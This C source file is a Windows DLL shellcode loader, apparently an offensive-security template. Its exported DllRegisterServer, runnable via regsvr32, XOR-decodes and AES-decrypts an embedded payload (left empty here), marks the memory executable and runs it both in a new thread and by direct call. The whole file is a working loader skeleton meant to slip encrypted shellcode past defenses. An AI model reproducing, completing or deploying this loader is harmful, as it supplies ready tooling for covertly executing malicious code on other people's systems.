#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include "base64.h"
#include <stdlib.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")

unsigned char* generate_low_entropy_xor_key(DWORD keyLen) {
    unsigned char* xorKey = (unsigned char*)malloc(keyLen);
    for (DWORD i = 0; i < keyLen; i++) {
        xorKey[i] = (unsigned char)(rand() % 256);
    }
    return xorKey;
}

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
}

void XOREncrypt(char* data, DWORD dataSize, char* xorKey, DWORD xorKeyLen) {
    for (DWORD i = 0; i < dataSize; i++) {
        data[i] ^= xorKey[i % xorKeyLen];
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
    __declspec(dllexport) BOOL WINAPI DllRegisterServer(void) {
        MessageBox(NULL, "git5", "LoxoSec", MB_OK);

        unsigned char* XORKey = generate_low_entropy_xor_key(32);
        unsigned char AESKey[] = { }; 
        unsigned char payload[] = { };

        DWORD payloadLength = sizeof(payload);

        LPVOID allocMem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (!allocMem) {
            printf("Failed to Allocate memory (%u)\n", GetLastError());
            return -1;
        }

        XOREncrypt((char*)payload, payloadLength, (char*)XORKey, 32);
        DecryptAES((char*)payload, payloadLength, AESKey, sizeof(AESKey));
        MoveMemory(allocMem, payload, sizeof(payload));

        DWORD oldProtect;

        if (!VirtualProtect(allocMem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
            printf("Failed to change memory protection (%u)\n", GetLastError());
            return -2;
        }

        HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocMem, NULL, 0, NULL);

        if (!tHandle) {
            printf("Failed to Create the thread (%u)\n", GetLastError());
            return -3;
        }

        printf("\n\nalloc_mem : %p\n", allocMem);
        WaitForSingleObject(tHandle, INFINITE);
        ((void(*)())allocMem)();

        return 0;
    }
}
